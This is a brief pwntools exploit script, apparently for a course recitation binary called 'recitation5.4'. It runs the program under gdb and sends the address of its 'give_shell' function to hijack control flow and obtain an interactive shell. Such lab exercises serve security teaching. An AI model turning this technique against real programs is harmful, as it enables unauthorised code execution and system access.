from pwn import *

# context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
e = ELF("./recitation5.4", checksec=False)

# p = process("./recitation5.4")
p = gdb.debug("./recitation5.4", '''
b main
continue
''')
p.recvline()
p.send(p64(e.symbols.give_shell))
p.interactive()
